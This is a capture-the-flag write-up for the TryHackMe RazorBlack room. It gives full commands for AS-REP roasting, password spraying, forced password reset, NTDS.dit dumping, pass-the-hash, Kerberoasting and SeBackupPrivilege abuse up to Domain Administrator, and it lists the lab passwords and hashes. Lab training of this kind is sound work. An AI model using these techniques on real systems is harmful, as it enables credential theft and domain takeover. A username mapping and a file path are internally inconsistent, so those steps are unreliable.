# THM RazorBlack

https://tryhackme.com/room/raz0rblack

A Windows Active Directory box exploited through **NFS share enumeration** (employee name list → username generation), **AS-REP roasting** (`twilliams`), **password spraying** and **forced password change** (`sbradley`), **NTDS.dit extraction** from a ZIP on an SMB share, **pass-the-hash** to `lvetrova`, **Kerberoasting** to `xyan1d3`, and finally **SeBackupPrivilege** abuse (diskshadow + secretsdump) to obtain the Domain Administrator hash.

---

## 1. Reconnaissance

### Nmap

```
sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
```

Key services found:

| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 111 | rpcbind / NFS |
| 135 | MSRPC |
| 139/445 | SMB |
| 389/636 | LDAP |
| 2049 | NFS |
| 3268/3269 | Global Catalog |
| 3389 | RDP |
| 5985 | WinRM |

Domain: `raz0rblack.thm`. This is a Domain Controller with NFS exposed — unusual for AD, and worth investigating immediately.

```
echo "<IP> raz0rblack.thm" | sudo tee -a /etc/hosts
```

### NFS Enumeration

NFS on a Windows DC is uncommon. Check for exported shares:

```
showmount -e <IP>
```

Mount the share:

```
mkdir creds
mount -t nfs <IP>:/users ./creds
```

The mounted share contains an `.xlsx` file with a list of employee full names. Convert these to likely AD username format (first-initial + surname):

| Full Name | Username |
|-----------|----------|
| Tyson Williams | twilliams |
| Jane Bryan | jbryan |
| Lilian Voss | lvetrova |
| Steven Bradley | sbradley |
| Xyan1d3 | xyan1d3 |

Save to a file:

```
cat > users.txt << 'EOF'
twilliams
jbryan
lvetrova
sbradley
xyan1d3
EOF
```

## 2. AS-REP Roasting → `twilliams`

With a list of usernames, try AS-REP roasting to find accounts with Kerberos pre-authentication disabled:

```
impacket-GetNPUsers raz0rblack.thm/ -usersfile users.txt -dc-ip <IP>
```

`twilliams` returns an AS-REP hash (Kerberos 5 AS-REP etype 23).

Crack with John:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
roastpotatoes    (twilliams)
```

```
twilliams : roastpotatoes
```

---

## 3. RID Brute Forcing

With valid credentials, enumerate all domain users:

```
crackmapexec smb <IP> -u twilliams -p roastpotatoes --rid-brute
```

This reveals additional users including `xyan1d3`, `lvetrova`, and `sbradley`.

---

## 4. Password Spray → `sbradley` (password must change)

Spray `twilliams`'s password across all users:

```
crackmapexec smb <IP> -u users.txt -p roastpotatoes --continue-on-success
```

`sbradley` returns `STATUS_PASSWORD_MUST_CHANGE` — the account exists and the password matches, but must be changed before use.

Force a password change remotely:

```
smbpasswd -r <IP> -U sbradley
```

Enter the old password (`roastpotatoes`), then set a new one.

```
sbradley : <new password you set>
```

## 5. SMB as `sbradley` → NTDS.dit in a ZIP

```
smbmap -H <IP> -u sbradley -p '<new password>'
```

The `trash` share is accessible. Connect and download:

```
smbclient //<IP>/trash --user='sbradley%<new password>'
```

```
smb: \> mget *
```

This yields `experiment_gone_wrong.zip`, which is password-protected.

### Cracking the ZIP

```
zip2john experiment_gone_wrong.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```

Extract with the cracked password. The ZIP contains:
- `system.hive` — SYSTEM registry hive
- `ntds.dit` — Active Directory database

## 6. Secretsdump → `lvetrova` Hash

```
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL
```

This dumps all domain account hashes. Extract `lvetrova`'s NT hash:

```
lvetrova : f220d3988deb3f516c73f40ee16c431d
```

### WinRM as `lvetrova`

```
evil-winrm -i <IP> -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
```

In `lvetrova`'s home directory, a `lvetrova.xml` file contains PowerShell-encrypted credentials (the user flag).

## 7. Kerberoasting → `xyan1d3`

With `lvetrova`'s access, request TGS tickets for service accounts:

```
impacket-GetUserSPNs -dc-ip <IP> raz0rblack.thm/lvetrova -hashes :f220d3988deb3f516c73f40ee16c431d -outputfile kerb.txt
```

Crack the Kerberoast hash:

```
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
```

```
cyanide9amine5628    (xyan1d3)
```

```
xyan1d3 : cyanide9amine5628
```

## 8. SeBackupPrivilege → Administrator

```
evil-winrm -i <IP> -u xyan1d3 -p cyanide9amine5628
```

```powershell
whoami /all
```

`xyan1d3` has **SeBackupPrivilege** enabled — can read any file on the system.

### Dump NTDS.dit via Diskshadow

Create `diskshadow.txt`:

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% e:
```

Convert line endings (important — diskshadow needs DOS-format):

```
unix2dos diskshadow.txt
```

Upload and execute:

```powershell
upload diskshadow.txt
cd c:\windows\tasks
diskshadow.exe /s C:\tmp\diskshadow.txt
```

Copy NTDS.dit from the shadow copy:

```powershell
robocopy /b e:\windows\ntds . ntds.dit
reg save HKLM\SYSTEM C:\tmp\system
```

Download both files to Kali and dump:

```
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

Extract the Administrator hash:

```
Administrator : 9689931bed40ca5a2ce1218210177f0c
```

evil-winrm -i <IP> -u Administrator -H 9689931bed40ca5a2ce1218210177f0c

## Lessons Learned

- **NFS on a Windows DC is unusual and worth investigating** — the exported share leaked an employee roster that seeded the entire attack.
- **Convert full names to likely username formats** (first-initial + surname) for spraying and roasting.
- **AS-REP roasting** identifies accounts with pre-auth disabled — `twilliams` gave the first valid credential without needing any password.
- **`STATUS_PASSWORD_MUST_CHANGE`** is not a failure — use `smbpasswd` to set a new password and proceed.
- **NTDS.dit + SYSTEM hive in a ZIP** = offline dump of every domain credential. `impacket-secretsdump` extracts all hashes.
- **Kerberoasting** as a low-privilege domain user can crack service account passwords — `xyan1d3` fell to `rockyou.txt`.
- **SeBackupPrivilege + diskshadow** on a DC = full domain compromise (same technique as HTB Cicada).
